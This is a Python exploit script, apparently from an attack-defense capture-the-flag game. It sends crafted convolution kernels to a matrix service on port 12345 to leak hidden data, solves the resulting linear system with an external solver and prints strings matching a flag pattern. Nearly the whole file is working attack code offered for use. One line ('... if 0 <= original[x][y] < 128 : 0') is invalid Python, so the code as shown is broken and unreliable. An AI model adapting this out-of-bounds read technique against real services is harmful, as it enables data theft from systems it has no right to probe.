#!/usr/bin/env python3

import asyncio
import re
import sys
import subprocess

import numpy
from numpy.linalg import lstsq

from client import Client, Convolution, Delimiter, prepare_matrix, prepare_id, parse

PORT = 12345
FLAG = re.compile('[0-9A-Z]{31}=')

KERNEL = [[1, 1], [0, 0]]
SPLOITS = [[[1, 1, 1, 1], [0, 0, 1, 0]], [[1, 1, 1, 0], [1, 0, 0, 1]]]

def is_flag_symbol(ch):
    if ch == ord('='):
        return True
    if ord('0') <= ch <= ord('9'):
        return True
    if ord('A') <= ch <= ord('Z'):
        return True
    return False

async def use_sploit(client, mid, s):
    _, _, sploit = prepare_matrix(s)

    client._Client__write_fields(Convolution, '2', '2 ')
    client.writer.write(prepare_id(mid))
    client.writer.write(sploit)
    await client.writer.drain()

    await client._Client__check_status()
    n = await client._Client__read_int()
    m = await client._Client__read_int()
    matrix_raw = await client.reader.readexactly(n * m * 4)
    return parse(4, n, m, matrix_raw)

def gen_equations(n, m, c, k, pwnd):
    a = []
    b = []
    for i in range(len(c)):
        for j in range(len(c[0])):
            aa = []
            for x in range(n):
                for y in range(m + 2):
                    if not(0 <= x - i < len(k)) or not(0 <= y - j < len(k[0])) or (not pwnd and y >= m):
                        aa.append(0)
                    else:
                        aa.append(k[x - i][y - j])
            a.append(aa)
            b.append(c[i][j])
    return (a, b)

async def main(host, mid):
    client = Client(host, PORT)
    await client.connect()

    convolution = await client.convolution(mid, KERNEL)
    pwnd = [await use_sploit(client, mid, s) for s in SPLOITS]
    await client.close()

    n = len(convolution) + len(KERNEL) - 1
    m = len(convolution[0]) + len(KERNEL[0]) - 1

    ca, cb = gen_equations(n, m, convolution, KERNEL, False)
    eq = (ca, cb)
    for i in range(len(SPLOITS)):
        pa, pb = gen_equations(n, m, pwnd[i], SPLOITS[i], True)
        eq = (eq[0] + pa, eq[1] + pb)

    solver = subprocess.Popen("./solver", stdin=subprocess.PIPE, stdout=subprocess.PIPE, encoding='ascii')
    print(len(eq[0]), len(eq[0][0]), file=solver.stdin)
    for i in range(len(eq[0])):
        print(*eq[0][i], eq[1][i], file=solver.stdin)
    solver.stdin.flush()

    solver.wait()
    orig = []
    for i in range(len(eq[0][0])):
        orig.append(int(solver.stdout.readline()))

    original = []
    for x in range(n):
        original.append([])
        for y in range(m + 2):
            original[-1].append(int(orig[x * (m + 2) + y]))

    data = []
    for y in range(m, m + 2):
        for x in range(1, n):
            data.append(original[x][y] if 0 <= original[x][y]  < 128 : 0)

    result = bytes(data).decode(encoding='ascii')

    for m in FLAG.finditer(result):
        print(m.group(0))

if __name__ == '__main__':
    asyncio.run(main(*sys.argv[1:]))

